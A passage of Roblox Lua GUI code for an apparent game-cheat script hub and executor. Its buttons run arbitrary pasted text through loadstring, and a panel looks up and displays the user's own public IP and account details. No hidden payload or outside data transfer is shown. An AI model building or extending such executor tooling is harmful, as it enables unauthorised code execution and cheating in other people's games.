DevelopersFrame.Size = UDim2.new(0, 380, 0, 199)
DevelopersFrame.ZIndex = 2

DevIcon.Name = ""DevIcon""
DevIcon.Parent = DevelopersFrame
DevIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevIcon.BackgroundTransparency = 0.8
DevIcon.Position = UDim2.new(0, 20, 0.01, 10)
DevIcon.Size = UDim2.new(0, 180, 0, 180)
DevIcon.Image = ""https://www.roblox.com/headshot-thumbnail/image?userId=3323558881&width=999&height=999&format=png""

DevIconUI.Parent = DevIcon
DevIconUI.CornerRadius = UDim.new(0, 12)

DevDesc.Name = ""DevDesc""
DevDesc.Parent = DevelopersFrame
DevDesc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevDesc.Position = UDim2.new(0, 210, 0.01, 10)
DevDesc.Size = UDim2.new(0, 150, 0, 180)
DevDesc.Font = Enum.Font.FredokaOne
DevDesc.Text = ""ERROR_CODE \n\n\nH.Programmer \n H.Designer \n H.Developer""
DevDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
DevDesc.TextSize = 20
DevDesc.BackgroundTransparency = 0.8

DevDescUICorner.CornerRadius = UDim.new(0, 12)
DevDescUICorner.Parent = DevDesc

ExecutorMenuButton.Name = ""ExecutorMenuButton""
ExecutorMenuButton.Position = UDim2.new(0, 20, 0.325, 10)
ExecutorMenuButton.Parent = MainFrame
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecutorMenuButton.BackgroundTransparency = 0.8
ExecutorMenuButton.LayoutOrder = 1
ExecutorMenuButton.Size = UDim2.new(0, 40, 0, 40)
ExecutorMenuButton.AutoButtonColor = false
ExecutorMenuButton.Font = Enum.Font.FredokaOne
ExecutorMenuButton.Text = ""</>""
ExecutorMenuButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecutorMenuButton.TextSize = 20

ExecutorMenuButtonUICorner.Parent = ExecutorMenuButton
ExecutorMenuButtonUICorner.CornerRadius = UDim.new(0, 12)

ExecutorMenuButton.MouseButton1Click:Connect(function()
UIClick:Play()
ScriptListFrame.Visible = false
PlayerDataFrame.Visible = false
DevelopersFrame.Visible = false
ExecutorMenuScrollingFrame.Visible = true
InfoBox.Visible = false
ClearTextBoxButton.Visible = true
CopyTextBoxButton.Visible = true
PasteScriptButton.Visible = true
ExecuteTextBoxButton.Visible = true
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
end)

ExecutorMenuScrollingFrame.CanvasSize = UDim2.new(0, 0, 4, 0)
ExecutorMenuScrollingFrame.ScrollBarImageColor3 = Color3.new(0, 0, 0)
ExecutorMenuScrollingFrame.ScrollBarThickness = 8
ExecutorMenuScrollingFrame.Active = true
ExecutorMenuScrollingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
ExecutorMenuScrollingFrame.BackgroundTransparency = 1
ExecutorMenuScrollingFrame.BorderSizePixel = 0
ExecutorMenuScrollingFrame.Position = UDim2.new(0, 70, 0.12, 10)
ExecutorMenuScrollingFrame.Size = UDim2.new(0, 380, 0, 150)
ExecutorMenuScrollingFrame.Name = ""ExecutorMenuScrollingFrame""
ExecutorMenuScrollingFrame.Parent = MainFrame

ExecutorMenuScrollingFrameUICorner.Parent = ExecutorMenuScrollingFrame

ExecutorTextBox.Name = ""ExecutorTextBox""
ExecutorTextBox.Parent = ExecutorMenuScrollingFrame
ExecutorTextBox.BackgroundColor3 = Color3.new(0, 0, 0)
ExecutorTextBox.BackgroundTransparency = 0.8
ExecutorTextBox.Position = UDim2.new(0.06, 0, 0, 0)
ExecutorTextBox.Size = UDim2.new(0, 335, 0, 1040)
ExecutorTextBox.Font = Enum.Font.Code
ExecutorTextBox.ClearTextOnFocus = false
ExecutorTextBox.FontSize = Enum.FontSize.Size18
ExecutorTextBox.Text = ""print(\""ECCS‚Ä¢Searcher V2\"")""
ExecutorTextBox.PlaceholderText = ""print(\""ECCS‚Ä¢Searcher V2\"")""
ExecutorTextBox.TextColor3 = Color3.new(0, 255, 0)
ExecutorTextBox.TextTransparency = 0
ExecutorTextBox.TextSize = 15
ExecutorTextBox.TextXAlignment = Enum.TextXAlignment.Left
ExecutorTextBox.TextYAlignment = Enum.TextYAlignment.Top
ExecutorTextBox.TextWrapped = true
 
ExecutorTextBoxUICorner.Parent = ExecutorTextBox

ClearTextBoxButton.Name = ""ClearTextBoxButton""
ClearTextBoxButton.Parent = MainFrame
ClearTextBoxButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearTextBoxButton.Position = UDim2.new(0, 95, 0.75, 10)
ClearTextBoxButton.Size = UDim2.new(0, 80, 0, 30)
ClearTextBoxButton.AutoButtonColor = false
ClearTextBoxButton.Font = Enum.Font.FredokaOne
ClearTextBoxButton.Text = ""Clear""
ClearTextBoxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearTextBoxButton.TextSize = 20
ClearTextBoxButton.BackgroundTransparency = 0.8

ClearTextBoxButtonUICorner.CornerRadius = UDim.new(0, 12)
ClearTextBoxButtonUICorner.Parent = ClearTextBoxButton

ClearTextBoxButton.MouseButton1Click:Connect(function()
UIClick:Play()
ExecutorTextBox.Text = """"
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Executor is clear!""
end)

ClearTextBoxButton.Visible = false

CopyTextBoxButton.Name = ""CopyTextBoxButton""
CopyTextBoxButton.Parent = MainFrame
CopyTextBoxButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyTextBoxButton.Position = UDim2.new(0, 180, 0.75, 10)
CopyTextBoxButton.Size = UDim2.new(0, 80, 0, 30)
CopyTextBoxButton.AutoButtonColor = false
CopyTextBoxButton.Font = Enum.Font.FredokaOne
CopyTextBoxButton.Text = ""Copy""
CopyTextBoxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyTextBoxButton.TextSize = 20
CopyTextBoxButton.BackgroundTransparency = 0.8

CopyTextBoxButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyTextBoxButtonUICorner.Parent = CopyTextBoxButton

CopyTextBoxButton.MouseButton1Click:Connect(function()
UIClick:Play()
setclipboard(ExecutorTextBox.Text)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script copied into your clipboard!""
end)

CopyTextBoxButton.Visible = false

ExecuteTextBoxButton.Name = ""ExecuteTextBoxButton""
ExecuteTextBoxButton.Parent = MainFrame
ExecuteTextBoxButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteTextBoxButton.Position = UDim2.new(0, 348, 0.75, 10)
ExecuteTextBoxButton.Size = UDim2.new(0, 80, 0, 30)
ExecuteTextBoxButton.AutoButtonColor = false
ExecuteTextBoxButton.Font = Enum.Font.FredokaOne
ExecuteTextBoxButton.Text = ""Execute""
ExecuteTextBoxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteTextBoxButton.TextSize = 20
ExecuteTextBoxButton.BackgroundTransparency = 0.8

ExecuteTextBoxButtonUICorner.CornerRadius = UDim.new(0, 12)
ExecuteTextBoxButtonUICorner.Parent = ExecuteTextBoxButton

PasteScriptButton.Name = ""PasteScriptButton""
PasteScriptButton.Parent = MainFrame
PasteScriptButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PasteScriptButton.Position = UDim2.new(0, 265, 0.75, 10)
PasteScriptButton.Size = UDim2.new(0, 80, 0, 30)
PasteScriptButton.AutoButtonColor = false
PasteScriptButton.Font = Enum.Font.FredokaOne
PasteScriptButton.Text = ""Paste""
PasteScriptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
PasteScriptButton.TextSize = 20
PasteScriptButton.BackgroundTransparency = 0.8
PasteScriptButton.Visible = false
PasteScriptButtonUICorner.CornerRadius = UDim.new(0, 12)
PasteScriptButtonUICorner.Parent = PasteScriptButton

ExecuteTextBoxButton.MouseButton1Click:Connect(function()
UIClick:Play()
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
loadstring(ExecutorTextBox.Text)()
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script executed!""
end)

PasteScriptButton.MouseButton1Click:Connect(function()
UIClick:Play()
ExecutorTextBox.Text = getclipboard()
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script pasted!""
end)

ExecuteTextBoxButton.Visible = false

ExecutorTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
       UIClick:Play()
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
loadstring(ExecutorTextBox.Text)()
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script executed!""
    end
end)

PlayerIcon.Name = ""PlayerIcon""
PlayerIcon.Parent = MainFrame
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PlayerIcon.BackgroundTransparency = 0.8
PlayerIcon.Position = UDim2.new(0, 20, 0.705, 10)
PlayerIcon.Size = UDim2.new(0, 40, 0, 40)
PlayerIcon.AutoButtonColor = false
PlayerIcon.Image = ""https://www.roblox.com/headshot-thumbnail/image?userId="".. game.Players.LocalPlayer.UserId ..""&width=999&height=999&format=png""

PlayerIconUICorner.Parent = PlayerIcon
PlayerIconUICorner.CornerRadius = UDim.new(0, 12)

PlayerIcon.MouseButton1Click:Connect(function()
UIClick:Play()
PasteScriptButton.Visible = false
ScriptListFrame.Visible = false
PlayerDataFrame.Visible = true
ExecutorMenuScrollingFrame.Visible = false
ClearTextBoxButton.Visible = false
CopyTextBoxButton.Visible = false
InfoBox.Visible = false
ExecuteTextBoxButton.Visible = false
DevelopersFrame.Visible = false
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
end)

SearcherMenuButton.Name = ""SearcherMenuButton""
SearcherMenuButton.Position = UDim2.new(0, 20, 0.515, 10)
SearcherMenuButton.Parent = MainFrame
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
SearcherMenuButton.BackgroundTransparency = 0.8
SearcherMenuButton.LayoutOrder = 1
SearcherMenuButton.Size = UDim2.new(0, 40, 0, 40)
SearcherMenuButton.AutoButtonColor = false
SearcherMenuButton.Font = Enum.Font.FredokaOne
SearcherMenuButton.Text = ""üîé""
SearcherMenuButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SearcherMenuButton.TextSize = 20

SearcherMenuButtonUICorner.Parent = SearcherMenuButton
SearcherMenuButtonUICorner.CornerRadius = UDim.new(0, 12)

SearcherMenuButton.MouseButton1Click:Connect(function()
UIClick:Play()
PasteScriptButton.Visible = false
ScriptListFrame.Visible = true
PlayerDataFrame.Visible = false
ExecutorMenuScrollingFrame.Visible = false
ClearTextBoxButton.Visible = false
CopyTextBoxButton.Visible = false
InfoBox.Visible = false
ExecuteTextBoxButton.Visible = false
DevelopersFrame.Visible = false
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
end)

ExecutorMenuScrollingFrame.Visible = false

PlayerDataFrame.Name = ""PlayerDataFrame""
PlayerDataFrame.Parent = MainFrame
PlayerDataFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerDataFrame.BackgroundTransparency = 1
PlayerDataFrame.BorderSizePixel = 0
PlayerDataFrame.Position = UDim2.new(0, 70, 0.1, 10)
PlayerDataFrame.Size = UDim2.new(0, 380, 0, 199)
PlayerDataFrame.ZIndex = 2
 
PlayerDataFrame.Visible = false
 
PlayerPicture.Name = ""PlayerPicture""
PlayerPicture.Parent = PlayerDataFrame
PlayerPicture.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PlayerPicture.BackgroundTransparency = 0.8
PlayerPicture.Position = UDim2.new(0, 20, 0.01, 10)
PlayerPicture.Size = UDim2.new(0, 100, 0, 100)
PlayerPicture.Image = ""https://www.roblox.com/headshot-thumbnail/image?userId="".. game.Players.LocalPlayer.UserId ..""&width=999&height=999&format=png""
 
PlayerPictureUICorner.Parent = PlayerPicture
PlayerPictureUICorner.CornerRadius = UDim.new(0, 12)
 
PlayerDataBackground.Name = ""PlayerDataBackground""
PlayerDataBackground.Parent = PlayerDataFrame
PlayerDataBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PlayerDataBackground.Position = UDim2.new(0, 130, 0.01, 10)
PlayerDataBackground.Size = UDim2.new(0, 230, 0, 100)
PlayerDataBackground.BackgroundTransparency = 0.8
 
PlayerDataBackgroundUICorner.CornerRadius = UDim.new(0, 12)
PlayerDataBackgroundUICorner.Parent = PlayerDataBackground
 
PlayerDataTextLabel.Name = ""PlayerDataTextLabel""
PlayerDataTextLabel.Parent = PlayerDataFrame
PlayerDataTextLabel.BackgroundTransparency = 1
PlayerDataTextLabel.Position = UDim2.new(0, 240, 0.06, 10)
PlayerDataTextLabel.Size = UDim2.new(0, 5, 0, 5)
PlayerDataTextLabel.Font = Enum.Font.FredokaOne
PlayerDataTextLabel.Text = ""Player Data""
PlayerDataTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerDataTextLabel.TextSize = 30
 
PlayerIP.Name = ""PlayerIP""
PlayerIP.Parent = PlayerDataFrame
PlayerIP.BackgroundTransparency = 1
PlayerIP.Position = UDim2.new(0, 135, 0, 45)
PlayerIP.Size = UDim2.new(0, 120, 0, 15)
PlayerIP.Font = Enum.Font.FredokaOne
PlayerIP.Text = """"..game:HttpGet(""http://api.ipify.org"")
PlayerIP.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerIP.TextSize = 15
PlayerIP.TextXAlignment = Enum.TextXAlignment.Left

PlayerID.Name = ""PlayerID""
PlayerID.Parent = PlayerDataFrame
PlayerID.BackgroundTransparency = 1
PlayerID.Position = UDim2.new(0, 255, 0, 45)
PlayerID.Size = UDim2.new(0, 100, 0, 15)
PlayerID.Font = Enum.Font.FredokaOne
PlayerID.Text = """"..game.Players.LocalPlayer.UserId
PlayerID.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerID.TextSize = 15
PlayerID.TextXAlignment = Enum.TextXAlignment.Right

PlayerDisplayName.Name = ""PlayerDisplayName""
PlayerDisplayName.Parent = PlayerDataFrame
PlayerDisplayName.BackgroundTransparency = 1
PlayerDisplayName.Position = UDim2.new(0, 135, 0, 65)
PlayerDisplayName.Size = UDim2.new(0, 120, 0, 15)
PlayerDisplayName.Font = Enum.Font.FredokaOne
PlayerDisplayName.Text = """"..game.Players.LocalPlayer.DisplayName
PlayerDisplayName.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerDisplayName.TextSize = 15
PlayerDisplayName.TextXAlignment = Enum.TextXAlignment.Left
 
PlayerName.Name = ""PlayerName""
PlayerName.Parent = PlayerDataFrame
PlayerName.BackgroundTransparency = 1
PlayerName.Position = UDim2.new(0, 255, 0, 65)
PlayerName.Size = UDim2.new(0, 100, 0, 15)
PlayerName.Font = Enum.Font.FredokaOne
PlayerName.Text = """"..game.Players.LocalPlayer.Name
PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.TextSize = 15
PlayerName.TextXAlignment = Enum.TextXAlignment.Right
 
PlayerAge.Name = ""PlayerAge""
PlayerAge.Parent = PlayerDataFrame
PlayerAge.BackgroundTransparency = 1
PlayerAge.Position = UDim2.new(0, 135, 0, 85)
PlayerAge.Size = UDim2.new(0, 120, 0, 15)
PlayerAge.Font = Enum.Font.FredokaOne
PlayerAge.Text = """"..game.Players.LocalPlayer.AccountAge
PlayerAge.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerAge.TextSize = 15
PlayerAge.TextXAlignment = Enum.TextXAlignment.Left
 
PlayerCountry.Name = ""PlayerCountry""
PlayerCountry.Parent = PlayerDataFrame
PlayerCountry.BackgroundTransparency = 1
PlayerCountry.Position = UDim2.new(0, 255, 0, 85)
PlayerCountry.Size = UDim2.new(0, 100, 0, 15)
PlayerCountry.Font = Enum.Font.FredokaOne
PlayerCountry.Text = """"..Country
PlayerCountry.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerCountry.TextSize = 15
PlayerCountry.TextXAlignment = Enum.TextXAlignment.Right
 
ReloadPlayerDataButton.Name = ""ReloadPlayerDataButton""
ReloadPlayerDataButton.Parent = PlayerDataFrame
ReloadPlayerDataButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ReloadPlayerDataButton.Position = UDim2.new(0, 20, 0.6, 10)
ReloadPlayerDataButton.Size = UDim2.new(0, 150, 0, 50)
ReloadPlayerDataButton.AutoButtonColor = false
ReloadPlayerDataButton.Font = Enum.Font.FredokaOne
ReloadPlayerDataButton.Text = ""Reload data""
ReloadPlayerDataButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ReloadPlayerDataButton.TextSize = 25
ReloadPlayerDataButton.BackgroundTransparency = 0.8
 
ReloadPlayerDataButtonUICorner.CornerRadius = UDim.new(0, 12)
ReloadPlayerDataButtonUICorner.Parent = ReloadPlayerDataButton
 
ReloadPlayerDataButton.MouseButton1Click:Connect(function()
UIClick:Play()
PlayerIP.Text = """"..game:HttpGet(""http://api.ipify.org"")
PlayerID.Text = """"..game.Players.LocalPlayer.UserId
PlayerDisplayName.Text = """"..game.Players.LocalPlayer.DisplayName
PlayerName.Text = """"..game.Players.LocalPlayer.Name
PlayerAge.Text = """"..game.Players.LocalPlayer.AccountAge
PlayerCountry.Text = """"..Country
PlayerPicture.Image = ""https://www.roblox.com/headshot-thumbnail/image?userId="".. game.Players.LocalPlayer.UserId ..""&width=999&height=999&format=png""
PlayerIcon.Image = ""https://www.roblox.com/headshot-thumbnail/image?userId="".. game.Players.LocalPlayer.UserId ..""&width=999&height=999&format=png""
writefile(""ECCS_Searcher_V2.4Executor.ECCS"", ExecutorTextBox.Text)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Data reloaded!""
end)
 
CopyPlayerDataButton.Name = ""CopyPlayerDataButton""
CopyPlayerDataButton.Parent = PlayerDataFrame
CopyPlayerDataButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyPlayerDataButton.Position = UDim2.new(0, 210, 0.6, 10)
CopyPlayerDataButton.Size = UDim2.new(0, 150, 0, 50)
CopyPlayerDataButton.AutoButtonColor = false
CopyPlayerDataButton.Font = Enum.Font.FredokaOne
CopyPlayerDataButton.Text = ""Copy data""
CopyPlayerDataButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyPlayerDataButton.TextSize = 25
CopyPlayerDataButton.BackgroundTransparency = 0.8
 
CopyPlayerDataButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyPlayerDataButtonUICorner.Parent = CopyPlayerDataButton
 
CopyPlayerDataButton.MouseButton1Click:Connect(function()
UIClick:Play()
setclipboard(PlayerIP.Text)
setclipboard(PlayerID.Text)
setclipboard(PlayerDisplayName.Text)
setclipboard(PlayerName.Text)
setclipboard(PlayerAge.Text)
setclipboard(PlayerCountry.Text)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Data copied!""
end)

ScriptListFrame.Name = ""ScriptListFrame""
ScriptListFrame.Parent = MainFrame
ScriptListFrame.Active = true
ScriptListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptListFrame.BackgroundTransparency = 1
ScriptListFrame.BorderSizePixel = 0
ScriptListFrame.Position = UDim2.new(0, 70, 0.1, 10)
ScriptListFrame.Size = UDim2.new(0, 380, 0, 199)
ScriptListFrame.ZIndex = 2
ScriptListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

ScriptAuthor.Name = ""ScriptAuthor""
ScriptAuthor.Parent = ScriptFrame
ScriptAuthor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptAuthor.BackgroundTransparency = 1.000
ScriptAuthor.Position = UDim2.new(0, 10, 0, 65)
ScriptAuthor.Size = UDim2.new(0, 280, 0, 25)
ScriptAuthor.Font = Enum.Font.FredokaOne
ScriptAuthor.Text = ""By ScriptAuthor""
ScriptAuthor.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptAuthor.TextSize = 20
ScriptAuthor.TextWrapped = true
ScriptAuthor.TextXAlignment = Enum.TextXAlignment.Left

UIPadding.Parent = ScriptListFrame
UIPadding.PaddingBottom = UDim.new(0, 10)
UIPadding.PaddingLeft = UDim.new(0, 25)
UIPadding.PaddingRight = UDim.new(0, 25)
UIPadding.PaddingTop = UDim.new(0, 10)

Scripts.Name = ""Scripts""
Scripts.Parent = ScriptListFrame

UIGridLayout.Parent = Scripts
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 20, 0, 20)
UIGridLayout.CellSize = UDim2.new(0, 330, 0, 190)

ScriptFrame.Name = ""ScriptFrame""
ScriptFrame.Parent = Scripts
ScriptFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptFrame.BackgroundTransparency = 0.8
ScriptFrame.Size = UDim2.new(0, 9999, 0, 500)
ScriptFrame.Position = UDim2.new(1.5, 0, 0, 0)

UICorner_6.CornerRadius = UDim.new(0, 12)
UICorner_6.Parent = ScriptFrame

ScriptTitle.Name = ""ScriptTitle""
ScriptTitle.Parent = ScriptFrame
ScriptTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptTitle.BackgroundTransparency = 1.000
ScriptTitle.Position = UDim2.new(0, 10, 0, 10)
ScriptTitle.Size = UDim2.new(0, 180, 0, 40)
ScriptTitle.Font = Enum.Font.FredokaOne
ScriptTitle.Text = ""Script Title""
ScriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptTitle.TextScaled = true
ScriptTitle.TextSize = 14.000
ScriptTitle.TextWrapped = true
ScriptTitle.TextXAlignment = Enum.TextXAlignment.Left

ExecuteButton.Name = ""ExecuteButton""
ExecuteButton.Parent = ScriptFrame
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteButton.Position = UDim2.new(0.75, 0, 0.75, 0)
ExecuteButton.Size = UDim2.new(0, 75, 0, 30)
ExecuteButton.AutoButtonColor = false
ExecuteButton.Font = Enum.Font.FredokaOne
ExecuteButton.Text = ""Execute""
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.TextSize = 18
ExecuteButton.BackgroundTransparency = 0.8

UICorner_7.CornerRadius = UDim.new(0, 12)
UICorner_7.Parent = ExecuteButton

DescScriptButton.Name = ""DescScriptButton""
DescScriptButton.Parent = ScriptFrame
DescScriptButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DescScriptButton.Position = UDim2.new(0.885, 0, 0.02, 0)
DescScriptButton.Size = UDim2.new(0, 35, 0, 35)
DescScriptButton.AutoButtonColor = false
DescScriptButton.Font = Enum.Font.FredokaOne
DescScriptButton.Text = ""Ô∏ô""
DescScriptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DescScriptButton.TextSize = 32
DescScriptButton.BackgroundTransparency = 0.8

DescScriptButtonUICorner.CornerRadius = UDim.new(0, 12)
DescScriptButtonUICorner.Parent = DescScriptButton

DescScriptButton_2.Name = ""DescScriptButton""
DescScriptButton_2.Parent = VerifiedScriptFrame
DescScriptButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DescScriptButton_2.Position = UDim2.new(0.885, 0, 0.02, 0)
DescScriptButton_2.Size = UDim2.new(0, 35, 0, 35)
DescScriptButton_2.AutoButtonColor = false
DescScriptButton_2.Font = Enum.Font.FredokaOne
DescScriptButton_2.Text = ""Ô∏ô""
DescScriptButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
DescScriptButton_2.TextSize = 32
DescScriptButton_2.BackgroundTransparency = 0.8

DescScriptButtonUICorner_2.CornerRadius = UDim.new(0, 12)
DescScriptButtonUICorner_2.Parent = DescScriptButton_2

AutoExecuteButton.Name = ""AutoExecuteButton""
AutoExecuteButton.Parent = ScriptFrame
AutoExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AutoExecuteButton.Position = UDim2.new(0.885, 0, 0.22, 0)
AutoExecuteButton.Size = UDim2.new(0, 35, 0, 35)
AutoExecuteButton.AutoButtonColor = false
AutoExecuteButton.Font = Enum.Font.FredokaOne
AutoExecuteButton.Text = ""‚òÖ""
AutoExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoExecuteButton.TextSize = 30
AutoExecuteButton.BackgroundTransparency = 0.8

AutoExecuteButtonUICorner.CornerRadius = UDim.new(0, 12)
AutoExecuteButtonUICorner.Parent = AutoExecuteButton

AutoExecuteButton_2.Name = ""AutoExecuteButton""
AutoExecuteButton_2.Parent = VerifiedScriptFrame
AutoExecuteButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AutoExecuteButton_2.Position = UDim2.new(0.885, 0, 0.22, 0)
AutoExecuteButton_2.Size = UDim2.new(0, 35, 0, 35)
AutoExecuteButton_2.AutoButtonColor = false
AutoExecuteButton_2.Font = Enum.Font.FredokaOne
AutoExecuteButton_2.Text = ""‚òÖ""
AutoExecuteButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoExecuteButton_2.TextSize = 30
AutoExecuteButton_2.BackgroundTransparency = 0.8

AutoExecuteButtonUICorner_2.CornerRadius = UDim.new(0, 12)
AutoExecuteButtonUICorner_2.Parent = AutoExecuteButton_2

ChatButton.Name = ""ChatButton""
ChatButton.Parent = ScriptFrame
ChatButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ChatButton.Position = UDim2.new(0.885, 0, 0.42, 0)
ChatButton.Size = UDim2.new(0, 35, 0, 35)
ChatButton.AutoButtonColor = false
ChatButton.BackgroundTransparency = 0.8

ChatButton2.Name = ""ChatButton2""
ChatButton2.Parent = ChatButton
ChatButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ChatButton2.Position = UDim2.new(0.5, 0, 0.5, 0)
ChatButton2.Size = UDim2.new(0, 20, 0, 20)
ChatButton2.AnchorPoint = Vector2.new(0.5, 0.5)
ChatButton2.BorderSizePixel = 0
ChatButton2.Image = ""rbxassetid://18132342746""
ChatButton2.BackgroundTransparency = 1

ChatButtonUICorner.CornerRadius = UDim.new(0, 12)
ChatButtonUICorner.Parent = ChatButton

ChatButton_2.Name = ""ChatButton""
ChatButton_2.Parent = VerifiedScriptFrame
ChatButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ChatButton_2.Position = UDim2.new(0.885, 0, 0.42, 0)
ChatButton_2.Size = UDim2.new(0, 35, 0, 35)
ChatButton_2.AutoButtonColor = false
ChatButton_2.BackgroundTransparency = 0.8

ChatButton_22.Name = ""ChatButton_22""
ChatButton_22.Parent = ChatButton_2
ChatButton_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ChatButton_22.Position = UDim2.new(0.5, 0, 0.5, 0)
ChatButton_22.Size = UDim2.new(0, 20, 0, 20)
ChatButton_22.AnchorPoint = Vector2.new(0.5, 0.5)
ChatButton_22.BorderSizePixel = 0
ChatButton_22.Image = ""rbxassetid://18132342746""
ChatButton_22.BackgroundTransparency = 1

ChatButtonUICorner_2.CornerRadius = UDim.new(0, 12)
ChatButtonUICorner_2.Parent = ChatButton_2

OpenInExecutorButton.Name = ""OpenInExecutorButton""
OpenInExecutorButton.Parent = ScriptFrame
OpenInExecutorButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenInExecutorButton.Position = UDim2.new(0.265, 0, 0.75, 0)
OpenInExecutorButton.Size = UDim2.new(0, 75, 0, 30)
OpenInExecutorButton.AutoButtonColor = false
OpenInExecutorButton.Font = Enum.Font.FredokaOne
OpenInExecutorButton.Text = ""OIE""
OpenInExecutorButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenInExecutorButton.TextSize = 18
OpenInExecutorButton.BackgroundTransparency = 0.8

OpenInExecutorButtonUICorner.CornerRadius = UDim.new(0, 12)
OpenInExecutorButtonUICorner.Parent = OpenInExecutorButton

OpenInExecutorButton_2.Name = ""OpenInExecutorButton""
OpenInExecutorButton_2.Parent = VerifiedScriptFrame
OpenInExecutorButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenInExecutorButton_2.Position = UDim2.new(0.265, 0, 0.75, 0)
